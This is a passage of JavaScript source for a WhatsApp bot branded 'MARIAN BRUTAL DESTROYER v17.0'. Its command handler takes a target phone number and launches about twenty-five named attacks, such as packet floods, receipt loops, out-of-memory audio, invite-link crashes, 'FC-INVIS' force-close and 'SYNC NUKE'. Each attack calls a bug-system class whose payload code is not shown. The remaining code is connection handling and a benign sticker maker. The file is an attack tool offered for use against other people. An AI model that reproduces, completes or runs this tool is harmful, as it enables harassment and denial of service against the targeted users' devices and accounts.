        if (!body.startsWith(CONFIG.PREFIX)) return
        
        const args = body.slice(CONFIG.PREFIX.length).trim().split(/ +/)
        const command = args.shift().toLowerCase()
        const text = args.join(' ')
        
        log('INFO', `Command from ${from.split('@')[0]}: ${command} ${text}`)
        
        try {
            switch(command) {
                case 'menu':
                    await this.sock.sendMessage(from, { text: generateMenu() })
                    break
                    
                case 'ping':
                    await this.sock.sendMessage(from, { text: '⚡ MARIAN BRUTAL DESTROYER v17.0 ONLINE' })
                    break
                    
                case 'status':
                    const status = this.bugs.getAttackStatus()
                    const statusText = `📊 ATTACK STATUS:\nTotal Active: ${status.total}\nFC-INVIS: ${status.fcInvisActive ? 'ACTIVE' : 'INACTIVE'}\n\nActive Attacks:\n${status.attacks.map(a => `• ${a.id} - ${a.target} (${a.type})`).join('\n') || 'None'}`
                    await this.sock.sendMessage(from, { text: statusText })
                    break
                    
                case 'stopall':
                    const stopped = this.bugs.stopAllAttacks()
                    await this.sock.sendMessage(from, { text: `✅ Stopped ${stopped} attacks` })
                    break
                    
                // 🔴 DATABASE DESTROYER
                case 'nullstanza':
                    const target1 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count1 = parseInt(text.split(' ')[1]) || 10
                    await this.sock.sendMessage(from, { text: '🗃️ Executing NULL STANZA bug...' })
                    await this.bugs.nullStanzaBug(target1, count1)
                    await this.sock.sendMessage(from, { text: '✅ NULL STANZA attack delivered!' })
                    break
                    
                case 'packetflood':
                    const target2 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const packets = parseInt(text.split(' ')[1]) || 1000
                    await this.sock.sendMessage(from, { text: '🌊 Executing PACKET FLOOD...' })
                    await this.bugs.packetFloodBug(target2, packets)
                    await this.sock.sendMessage(from, { text: '✅ PACKET FLOOD completed!' })
                    break
                    
                case 'receiptloop':
                    const target3 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🔄 Starting RECEIPT LOOP...' })
                    const loopId = await this.bugs.receiptLoopBug(target3)
                    await this.sock.sendMessage(from, { text: `✅ RECEIPT LOOP started (ID: ${loopId.slice(0, 8)})` })
                    break
                    
                case 'forward999':
                    const target4 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count4 = parseInt(text.split(' ')[1]) || 10
                    await this.sock.sendMessage(from, { text: '🔄 Executing FORWARDING 999...' })
                    await this.bugs.forwarding999Bug(target4, count4)
                    await this.sock.sendMessage(from, { text: '✅ FORWARDING 999 attack delivered!' })
                    break
                    
                case 'stickermeta':
                    const target5 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🖼️ Executing STICKER METADATA bug...' })
                    await this.bugs.stickerMetadataBug(target5)
                    await this.sock.sendMessage(from, { text: '✅ STICKER METADATA attack delivered!' })
                    break
                    
                // 🟠 THERMAL THROTTLING
                case 'oomaudio':
                    const target6 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count6 = parseInt(text.split(' ')[1]) || 5
                    await this.sock.sendMessage(from, { text: '🎵 Executing OOM AUDIO bug...' })
                    await this.bugs.oomAudioBug(target6, count6)
                    await this.sock.sendMessage(from, { text: '✅ OOM AUDIO attack delivered!' })
                    break
                    
                case 'heavyvcard':
                    const target7 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '📇 Executing HEAVY VCARD bug...' })
                    await this.bugs.heavyVCardBug(target7)
                    await this.sock.sendMessage(from, { text: '✅ HEAVY VCARD attack delivered!' })
                    break
                    
                case 'unicodewaterfall':
                    const target8 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🌊 Executing UNICODE WATERFALL...' })
                    await this.bugs.unicodeWaterfallBug(target8)
                    await this.sock.sendMessage(from, { text: '✅ UNICODE WATERFALL attack delivered!' })
                    break
                    
                case 'ghostthumbnail':
                    const target9 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '👻 Executing GHOST THUMBNAIL...' })
                    await this.bugs.ghostThumbnailBug(target9)
                    await this.sock.sendMessage(from, { text: '✅ GHOST THUMBNAIL attack delivered!' })
                    break
                    
                case 'gifloopdead':
                    const target10 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🎬 Executing GIF LOOP DEAD...' })
                    await this.bugs.gifLoopDeadBug(target10)
                    await this.sock.sendMessage(from, { text: '✅ GIF LOOP DEAD attack delivered!' })
                    break
                    
                // 🟡 UI CRASH
                case 'quotedcall':
                    const target11 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '📞 Executing QUOTED CALL INFINITY...' })
                    await this.bugs.quotedCallInfinityBug(target11)
                    await this.sock.sendMessage(from, { text: '✅ QUOTED CALL INFINITY attack delivered!' })
                    break
                    
                case 'location999':
                    const target12 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '📍 Executing LOCATION 999...' })
                    await this.bugs.locationOutOfRangeBug(target12)
                    await this.sock.sendMessage(from, { text: '✅ LOCATION 999 attack delivered!' })
                    break
                    
                case 'buttonloop':
                    const target13 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🔘 Executing BUTTON LOOP...' })
                    await this.bugs.buttonLoopBug(target13)
                    await this.sock.sendMessage(from, { text: '✅ BUTTON LOOP attack delivered!' })
                    break
                    
                case 'invitecrash':
                    const target14 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🔗 Executing INVITE CRASH...' })
                    await this.bugs.inviteLinkCrashBug(target14)
                    await this.sock.sendMessage(from, { text: '✅ INVITE CRASH attack delivered!' })
                    break
                    
                case 'reactionboom':
                    const target15 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const reactions = parseInt(text.split(' ')[1]) || 500
                    await this.sock.sendMessage(from, { text: '💥 Executing REACTION BOOM...' })
                    await this.bugs.reactionExplosionBug(target15, reactions)
                    await this.sock.sendMessage(from, { text: '✅ REACTION BOOM attack delivered!' })
                    break
                    
                // 🟢 BUSINESS ATTACK
                case 'priceerror':
                    const target16 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '💰 Executing PRICE ERROR...' })
                    await this.bugs.priceCurrencyErrorBug(target16)
                    await this.sock.sendMessage(from, { text: '✅ PRICE ERROR attack delivered!' })
                    break
                    
                case 'orderfake':
                    const target17 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🛒 Executing ORDER FAKE...' })
                    await this.bugs.orderFakeBug(target17)
                    await this.sock.sendMessage(from, { text: '✅ ORDER FAKE attack delivered!' })
                    break
                    
                case 'docom':
                    const target18 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '📄 Executing DOC OOM...' })
                    await this.bugs.docOomBug(target18)
                    await this.sock.sendMessage(from, { text: '✅ DOC OOM attack delivered!' })
                    break
                    
                case 'profilebomb':
                    const target19 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '💣 Executing PROFILE BOMB...' })
                    await this.bugs.profilePictureBombBug(target19)
                    await this.sock.sendMessage(from, { text: '✅ PROFILE BOMB attack delivered!' })
                    break
                    
                case 'polloverload':
                    const target20 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '📊 Executing POLL OVERLOAD...' })
                    await this.bugs.pollOverloadBug(target20)
                    await this.sock.sendMessage(from, { text: '✅ POLL OVERLOAD attack delivered!' })
                    break
                    
                // ⚡ FC-INVIS BRUTAL
                case 'fcinvis':
                    const target21 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const intensity = parseInt(text.split(' ')[1]) || 50
                    await this.sock.sendMessage(from, { text: '⚡ Executing FC-INVIS BRUTAL...' })
                    const attackId = await this.bugs.fcInvisAttack(target21, intensity)
                    await this.sock.sendMessage(from, { text: `✅ FC-INVIS attack started (ID: ${attackId.slice(0, 8)})` })
                    break
                    
                case 'onetick':
                    const target22 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '⏱️ Executing ONE TICK...' })
                    const tickId = await this.bugs.oneTickAttack(target22)
                    await this.sock.sendMessage(from, { text: `✅ ONE TICK attack delivered (ID: ${tickId.slice(0, 8)})` })
                    break
                    
                case 'invisblock':
                    const target23 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const seconds = parseInt(text.split(' ')[1]) || 300
                    await this.sock.sendMessage(from, { text: '🚫 Executing INVISIBLE BLOCK...' })
                    const blockId = await this.bugs.invisibleBlockAttack(target23, seconds)
                    await this.sock.sendMessage(from, { text: `✅ INVISIBLE BLOCK active for ${seconds}s (ID: ${blockId.slice(0, 8)})` })
                    break
                    
                case 'brutalcombo':
                    const target24 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '💀 Executing BRUTAL COMBO...' })
                    const comboId = await this.bugs.brutalFcInvisCombo(target24)
                    await this.sock.sendMessage(from, { text: `✅ BRUTAL COMBO activated (ID: ${comboId.slice(0, 8)})` })
                    break
                    
                case 'syncnuke':
                    const target25 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '☢️ Executing SYNC NUKE...' })
                    const nukeId = await this.bugs.syncNuke(target25)
                    await this.sock.sendMessage(from, { text: `✅ SYNC NUKE detonated (ID: ${nukeId.slice(0, 8)})` })
                    break
                    
                // 🛠️ UTILITIES
                case 'sticker':
                    if (message?.message?.imageMessage) {
                        await this.sock.sendMessage(from, { text: '🔄 Creating sticker...' })
                        try {
                            const stream = await downloadContentFromMessage(message.message.imageMessage, 'image')
                            let buffer = Buffer.from([])
                            for await (const chunk of stream) {
                                buffer = Buffer.concat([buffer, chunk])
                            }
                            const stickerBuffer = await StickerMaker.createSticker(buffer)
                            if (stickerBuffer) {
                                await this.sock.sendMessage(from, {
                                    sticker: stickerBuffer
                                })
                            } else {
                                await this.sock.sendMessage(from, { text: '❌ Failed to create sticker' })
                            }
                        } catch (error) {
                            await this.sock.sendMessage(from, { text: `❌ Error: ${error.message}` })
                        }
                    } else {
                        await this.sock.sendMessage(from, { text: '📷 Reply to an image with /sticker' })
                    }
                    break
                    
                case 'destroy':
                    const target26 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '💀 ACTIVATING ULTIMATE DESTROYER...' })
                    const destroyerId = await this.bugs.ultimateDestroyer(target26)
                    await this.sock.sendMessage(from, { 
                        text: `✅ ULTIMATE DESTROYER ACTIVATED!\nTarget: ${target26.split('@')[0]}\nAttack ID: ${destroyerId.slice(0, 8)}` 
                    })
                    break
                    
                default:
                    await this.sock.sendMessage(from, { text: '❌ Unknown command. Type /menu for list' })
            }
        } catch (error) {
            log('ERROR', `Command error: ${error.message}`)
            await this.sock.sendMessage(from, { text: `❌ Error: ${error.message}` })
        }
    }
}

// ==================== [ MAIN SYSTEM ] ====================
async function startSystem() {
    try {
        console.log(chalk.red.bold(`
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║        ⚡ MARIAN BRUTAL DESTROYER v17.0                    ║
║              ALL SYSTEMS ONLINE                            ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
        `))
        
        // Start terminal pairing
        const sock = await terminalPairing()
        
        // Initialize bug system
        const bugSystem = new BrutalBugSystem(sock)
        const handler = new CommandHandler(sock, bugSystem)
        
        // Message handler
        sock.ev.on('messages.upsert', async ({ messages }) => {
            const msg = messages[0]
            if (!msg.message || msg.key.fromMe) return
            
            const from = msg.key.remoteJid
            const text = msg.message.conversation || 
                        msg.message.extendedTextMessage?.text || 
                        msg.message.imageMessage?.caption || ''
            
            await handler.handle(from, text, msg.message?.extendedTextMessage?.contextInfo?.quotedMessage, msg)
        })
        
        // Connection handler
        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect } = update
            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
                log('WARNING', `Connection closed. Reconnect: ${shouldReconnect}`)
                if (shouldReconnect) {
                    startSystem()
                }
            } else if (connection === 'open') {
                log('SUCCESS', 'Bot connected and ready!')
            }
        })
        
        // Auto-send menu on start
        setTimeout(async () => {
            try {
                const store = makeInMemoryStore({ })
                store.bind(sock.ev)
                
                log('MENU', 'Sending menu to bot...')
                
            } catch (e) {
                log('ERROR', `Startup error: ${e.message}`)
            }
        }, 5000)
        
    } catch (error) {
        log('ERROR', `System fatal error: ${error.message}`)
        console.log(chalk.red('\n[✗] System crashed. Restarting in 5 seconds...'))
        setTimeout(startSystem, 5000)
    }
}

// ==================== [ START APPLICATION ] ====================
console.log(chalk.yellow('Starting MARIAN BRUTAL DESTROYER v17.0...'))
startSystem()

// Handle process exit
process.on('SIGINT', () => {
    console.log(chalk.yellow('\n\n⚠️  System shutdown requested...'))
    process.exit(0)
})
